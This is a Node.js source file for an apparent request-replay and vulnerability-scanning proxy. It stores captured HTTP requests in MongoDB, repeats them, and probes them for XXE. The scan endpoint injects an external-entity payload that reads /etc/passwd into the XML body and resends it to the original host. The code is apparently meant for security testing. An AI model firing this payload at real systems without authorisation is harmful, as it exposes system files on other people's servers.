const express = require('express');
const MongoClient = require("mongodb").MongoClient;
const fetch = require('node-fetch');
const mongoUrl = 'mongodb://127.0.0.1:27017';

const app = express();
let db;
let collection;

function setRequestData(req) {
    const id = `Request_${req._id}`;
    let obj = {};
    let request = {};
    request.method = req.method;
    request.host = req.host;
    request.path = req.path;
    request.headers = req.headers;
    request.ssl = req.ssl;
    request.request = req.request;
    request.body = req.request_body.toString();
    obj[id] = request;
    return obj;
}

function getAllRequests(response) {
    let requestsArray = [];
    collection.find().toArray((err, res) => {
        for (let req of res) {
            let request = setRequestData(req);
            requestsArray.push(request);
        }
        response.send(requestsArray);
        console.log(requestsArray);
    });
}

function getRequest(response, id) {
    collection.findOne({_id: id}, (err, res) => {
        let request = setRequestData(res);
        response.send(request);
        console.log(request);
    });
}

function sendRequest(response, id) {
    collection.findOne({_id: id}, (err, request) => {
        let url = request.ssl ? 'https://' : 'http://' + `${request.host}${request.path}`;
        fetch(url, {
            method: request.method,
            headers: request.headers,
            body: (request.method !== 'GET' && request.method !== 'HEAD') ? request.request_body.toString() : undefined,
        }).then((resp) => {
            return resp.text();
        }).then((data) => {
            response.send(data);
            console.log(data);
        });
    });
}

function checkXXE(response, id) {
    collection.findOne({_id: id}, (err, request) => {
        console.log(request)

        request.request_body = request.request_body.toString();
        if (request.request_body === '' || request.request_body.match(/<\?xml/) === null) {
            response.send('No XXE in request');
            console.log('No XXE in request');
        } else {
            let str = request.request_body;
            let arr = str.split('<?xml');
            const border = arr[1].indexOf('>');
            let resStr = arr[0] + arr[1].substring(0, border + 1);
            resStr += `<!DOCTYPE foo [
                <!ELEMENT foo ANY >
                <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
                <foo>&xxe;</foo>
            `;
            resStr += arr[1].substring(border + 1, arr[1].length - 1);
            request.request_body = resStr;

            let url = request.ssl ? 'https://' : 'http://' + `${request.host}${request.path}`;
            fetch(url, {
                method: request.method,
                headers: request.headers,
                body: (request.method !== 'GET' && request.method !== 'HEAD') ? request.request_body : undefined,
            }).then((resp) => {
                return resp.text();
            }).then((data) => {
                if (data.match(/root:/) === null) {
                    console.log('No XXE in request');
                } else {
                    console.log('This request has XXE');
                }
            });
        }
    });
}


app.get('/', (request, response) => {
    response.send({arr: 'iefm'});
    console.log('hello!!!');
});

app.get('/requests', (request, response) => {
    getAllRequests(response);
});

app.get('/requests/:requestId', (request, response) => {
    getRequest(response, request.params['requestId']);
});

app.get('/repeat/:requestId', (request, response) => {
    sendRequest(response, request.params['requestId']);
});

app.get('/scan/:requestId', (request, response) => {
    checkXXE(response, request.params['requestId']);
});


MongoClient.connect(mongoUrl, { useNewUrlParser: true }, (err, client) => {
    if (err) {
        console.log(`Unable to connect ${err}`);
        return
    }
    console.log("Connected successfully to server");

    db = client.db("meteor");
    collection = db.collection("proxy");
    app.listen(8080);
})

